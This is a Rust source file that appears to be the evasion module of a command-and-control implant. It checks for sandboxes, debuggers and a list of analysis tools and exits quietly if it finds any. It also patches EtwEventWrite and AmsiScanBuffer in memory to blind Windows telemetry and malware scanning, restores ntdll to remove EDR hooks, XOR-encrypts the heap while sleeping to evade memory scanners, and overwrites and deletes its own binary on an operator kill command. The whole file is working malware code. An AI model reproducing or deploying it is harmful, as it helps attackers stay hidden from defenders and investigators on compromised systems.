//! Evasion monitor — pre-flight and in-loop checks.
//!
//! abort_if_sandboxed() runs once at startup. should_abort() runs every loop iteration.
//! Both return true if the agent should silently exit without doing anything.

const NO_EVASION: bool = {
    let b = env!("DM_NO_EVASION").as_bytes();
    b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
};

const SLEEP_ENCRYPT: bool = match option_env!("DM_SLEEP_ENCRYPT") {
    Some(v) => {
        let b = v.as_bytes();
        b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
    }
    None => false,
};

/// abort_if_sandboxed runs before registration.
/// Returns true if the environment looks like a sandbox or analysis VM.
pub fn abort_if_sandboxed() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_sandbox_artifact_present() { return true; }
        if is_suspicious_process_count() { return true; }
        if is_uptime_too_short()         { return true; }
    }
    false
}

/// should_abort runs every poll loop iteration.
/// Returns true if the environment changed in a way that suggests detection.
pub fn should_abort() -> bool {
    if NO_EVASION { return false; }
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present()      { return true; }
        if is_analysis_tool_running() { return true; }
    }
    false
}

/// startup_patches applies all compile-time-selected evasion patches before the
/// agent contacts the C2. Order matters:
///   1. unhook — restores clean ntdll .text so later patches hit unhooked stubs
///   2. etw-patch — blind ETW before any syscall traffic
///   3. amsi-patch — disable AMSI before any script execution
///   4. stack-spoof init — scan ntdll for ret gadget (needs clean ntdll)
///   5. stomped module loader — remap agent pages into a legitimate DLL (cosmetic)
pub fn startup_patches() {
    #[cfg(all(target_os = "windows", feature = "unhook"))]
    unhook_ntdll();

    #[cfg(all(target_os = "windows", feature = "etw-patch"))]
    patch_etw();

    #[cfg(all(target_os = "windows", feature = "amsi-patch"))]
    patch_amsi();

    #[cfg(all(target_arch = "x86_64", feature = "stack-spoof"))]
    crate::syscall::init_stack_spoof();
}

/// cleanup removes any artifacts left by the agent before exiting.
/// Called when the server sends a kill signal.
pub fn cleanup() {
    #[cfg(all(target_os = "windows", feature = "self-delete"))]
    self_delete();
}

/// masked_sleep XOR-encrypts the session key (and optionally the full heap)
/// for the duration of sleep so memory scanners cannot recover secrets at rest.
///
/// With `heap-encrypt` feature: walks the process heap and XOR-masks every
/// live allocation. HeapLock/HeapUnlock prevent concurrent allocation during the walk.
/// Without it: XOR-masks only the 32-byte session key (Phase 2 behaviour).
///
/// Skipped when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
    if NO_EVASION || !SLEEP_ENCRYPT {
        std::thread::sleep(duration);
        return;
    }

    // Derive a one-time XOR mask byte from subsecond entropy; never zero.
    let raw = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos()
        & 0xFF) as u8;
    let mask = if raw == 0 { 1u8 } else { raw };

    for b in key.iter_mut() { *b ^= mask; }

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask);

    std::thread::sleep(duration);

    #[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
    xor_heap(mask); // apply same mask again to undo (XOR is its own inverse)

    for b in key.iter_mut() { *b ^= mask; }
}

// ---------------------------------------------------------------------------
// Windows-specific checks
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(target_os = "windows")]
fn is_sandbox_artifact_present() -> bool {
    // Check for common sandbox artifacts:
    // - Known sandbox usernames
    // - Known sandbox hostnames
    // - Sandbox driver files
    let username = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let sandbox_users = ["sandbox", "analyst", "maltest", "test", "virus", "av", "malware"];
    if sandbox_users.iter().any(|u| username.contains(u)) {
        return true;
    }

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();
    let sandbox_hosts = ["sandbox", "analysis", "virus", "malware", "cuckoo"];
    if sandbox_hosts.iter().any(|h| hostname.contains(h)) {
        return true;
    }

    false
}

#[cfg(target_os = "windows")]
pub(crate) fn enum_process_names() -> Vec<String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    let mut names = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return names;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                names.push(String::from_utf16_lossy(&entry.szExeFile[..len]).to_lowercase());
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    names
}

#[cfg(target_os = "windows")]
fn is_suspicious_process_count() -> bool {
    enum_process_names().len() < 30
}

#[cfg(target_os = "windows")]
fn is_uptime_too_short() -> bool {
    // Sandboxes are often freshly booted; uptime < 5 min is suspicious
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    let uptime_ms = unsafe { GetTickCount64() };
    uptime_ms < 5 * 60 * 1000
}

#[cfg(target_os = "windows")]
fn is_analysis_tool_running() -> bool {
    const TOOLS: &[&str] = &[
        "wireshark.exe", "procmon.exe", "procmon64.exe",
        "processhacker.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
        "ida.exe", "ida64.exe", "idag.exe", "idat.exe",
        "autoruns.exe", "autoruns64.exe",
        "fiddler.exe", "burpsuite.exe",
        "dnspy.exe", "dotpeek64.exe",
    ];
    enum_process_names().iter().any(|n| TOOLS.contains(&n.as_str()))
}

// ── Phase 3 evasion primitives ────────────────────────────────────────────────

/// Patch EtwEventWrite in the in-memory ntdll with a `ret` stub so ETW-based
/// detections are blinded. The patch is applied in-process only.
#[cfg(all(target_os = "windows", feature = "etw-patch"))]
pub fn patch_etw() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 { return; }
        let fn_ptr = match GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr()) {
            Some(p) => p as *mut u8,
            None => return,
        };
        let mut old_prot: u32 = 0;
        if VirtualProtect(fn_ptr as *const core::ffi::c_void, 1, 0x40, &mut old_prot) == 0 {
            return;
        }
        // Patch with `ret` (0xC3): EtwEventWrite returns immediately, writing nothing.
        *fn_ptr = 0xC3;
        VirtualProtect(fn_ptr as *const core::ffi::c_void, 1, old_prot, &mut old_prot);
    }
}

/// Patch AmsiScanBuffer in amsi.dll with a `mov eax, 0x80070057; ret` stub
/// so it returns E_INVALIDARG, causing the AMSI consumer to skip the scan.
/// amsi.dll may not be loaded in non-.NET hosts; that is acceptable.
#[cfg(all(target_os = "windows", feature = "amsi-patch"))]
pub fn patch_amsi() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
    use windows_sys::Win32::System::Memory::VirtualProtect;

    // AMSI is a late-loaded DLL; load it if not yet mapped.
    unsafe {
        let amsi = {
            let h = GetModuleHandleA(b"amsi.dll\0".as_ptr());
            if h != 0 { h } else { LoadLibraryA(b"amsi.dll\0".as_ptr()) }
        };
        if amsi == 0 { return; }
        let fn_ptr = match GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr()) {
            Some(p) => p as *mut u8,
            None => return,
        };
        // Patch: B8 57 00 07 80  C3
        //        mov eax, 0x80070057 (E_INVALIDARG)
        //        ret
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let mut old_prot: u32 = 0;
        if VirtualProtect(fn_ptr as *const core::ffi::c_void, patch.len(), 0x40, &mut old_prot) == 0 {
            return;
        }
        core::ptr::copy_nonoverlapping(patch.as_ptr(), fn_ptr, patch.len());
        VirtualProtect(fn_ptr as *const core::ffi::c_void, patch.len(), old_prot, &mut old_prot);
    }
}

/// Restore ntdll.dll's .text section from the clean on-disk copy at
/// %SystemRoot%\System32\ntdll.dll, removing all userland EDR hooks.
///
/// Safety: we hold no ntdll locks during the copy. The write must be to the
/// executable image section in-memory, not to the file on disk.
#[cfg(all(target_os = "windows", feature = "unhook"))]
pub fn unhook_ntdll() {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows_sys::Win32::System::Memory::VirtualProtect;

    unsafe {
        // Locate in-memory ntdll
        let ntdll_mem = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
        if ntdll_mem.is_null() { return; }

        // Build path to on-disk ntdll
        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        let path = format!("{}\\System32\\ntdll.dll", sysroot);

        // Read the on-disk copy
        let disk_bytes = match std::fs::read(&path) {
            Ok(b) => b,
            Err(_) => return,
        };
        if disk_bytes.len() < 64 { return; }

        // Parse the disk PE to find .text section
        let e_lfanew = u32::from_le_bytes([
            disk_bytes[0x3C], disk_bytes[0x3D], disk_bytes[0x3E], disk_bytes[0x3F],
        ]) as usize;
        if disk_bytes.len() < e_lfanew + 24 { return; }

        let num_sections = u16::from_le_bytes([
            disk_bytes[e_lfanew + 6], disk_bytes[e_lfanew + 7],
        ]) as usize;
        let opt_size = u16::from_le_bytes([
            disk_bytes[e_lfanew + 20], disk_bytes[e_lfanew + 21],
        ]) as usize;
        let sh_base = e_lfanew + 24 + opt_size;

        for i in 0..num_sections {
            let s = sh_base + i * 40;
            if disk_bytes.len() < s + 40 { break; }

            // Section name is 8 bytes at offset s; check for ".text\0\0\0"
            let name = &disk_bytes[s..s+8];
            let is_text = name.starts_with(b".text");
            if !is_text { continue; }

            let virt_rva = u32::from_le_bytes([
                disk_bytes[s+12], disk_bytes[s+13], disk_bytes[s+14], disk_bytes[s+15],
            ]) as usize;
            let virt_size = u32::from_le_bytes([
                disk_bytes[s+8],  disk_bytes[s+9],  disk_bytes[s+10], disk_bytes[s+11],
            ]) as usize;
            let raw_off = u32::from_le_bytes([
                disk_bytes[s+20], disk_bytes[s+21], disk_bytes[s+22], disk_bytes[s+23],
            ]) as usize;
            let raw_size = u32::from_le_bytes([
                disk_bytes[s+16], disk_bytes[s+17], disk_bytes[s+18], disk_bytes[s+19],
            ]) as usize;

            if raw_off + raw_size > disk_bytes.len() { break; }

            let copy_size = virt_size.min(raw_size);
            let target = ntdll_mem.add(virt_rva) as *mut u8;

            // Make the section writable, copy, restore permissions
            const PAGE_EXECUTE_READWRITE: u32 = 0x40;
            const PAGE_EXECUTE_READ:      u32 = 0x20;
            let mut old_prot: u32 = 0;
            if VirtualProtect(
                target as *const core::ffi::c_void,
                copy_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_prot,
            ) == 0 { break; }

            core::ptr::copy_nonoverlapping(
                disk_bytes.as_ptr().add(raw_off),
                target,
                copy_size,
            );

            VirtualProtect(
                target as *const core::ffi::c_void,
                copy_size,
                PAGE_EXECUTE_READ,
                &mut old_prot,
            );
            break;
        }
    }
}

/// XOR-mask every live heap allocation with `key`.
/// Called twice (before and after sleep) to encrypt and then decrypt in place.
/// HeapLock prevents concurrent allocations from racing with our walk.
#[cfg(all(target_os = "windows", feature = "heap-encrypt"))]
fn xor_heap(key: u8) {
    use windows_sys::Win32::System::Memory::{
        GetProcessHeap, HeapLock, HeapUnlock, HeapWalk, PROCESS_HEAP_ENTRY,
    };

    const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x0004;

    unsafe {
        let heap = GetProcessHeap();
        if heap == 0 { return; }
        if HeapLock(heap) == 0 { return; }

        let mut entry: PROCESS_HEAP_ENTRY = core::mem::zeroed();
        // HeapWalk returns 0 when there are no more entries.
        while HeapWalk(heap, &mut entry) != 0 {
            if entry.wFlags & PROCESS_HEAP_ENTRY_BUSY != 0 {
                let ptr = entry.lpData as *mut u8;
                let size = entry.cbData as usize;
                for i in 0..size {
                    *ptr.add(i) ^= key;
                }
            }
        }

        HeapUnlock(heap);
    }
}

/// Overwrite and delete the agent executable from disk so it leaves no binary on disk
/// after the operator issues a kill command.
#[cfg(all(target_os = "windows", feature = "self-delete"))]
pub fn self_delete() {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, DeleteFileW, WriteFile,
        FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
        OPEN_EXISTING,
    };
    use windows_sys::Win32::System::LibraryLoader::GetModuleFileNameW;

    // GENERIC_WRITE = 0x40000000
    const GENERIC_WRITE: u32 = 0x40000000;

    unsafe {
        let mut path = [0u16; 32768];
        let len = GetModuleFileNameW(0, path.as_mut_ptr(), path.len() as u32);
        if len == 0 { return; }

        // Overwrite the file with zeros before deleting to defeat file-carving recovery.
        let h = CreateFileW(
            path.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            0,
        );
        if h != INVALID_HANDLE_VALUE && h != 0 {
            let zeros = vec![0u8; 65536];
            let mut written: u32 = 0;
            loop {
                let ok = WriteFile(h, zeros.as_ptr(), zeros.len() as u32, &mut written, core::ptr::null_mut());
                if ok == 0 || written == 0 { break; }
            }
            CloseHandle(h);
        }

        DeleteFileW(path.as_ptr());
    }
}
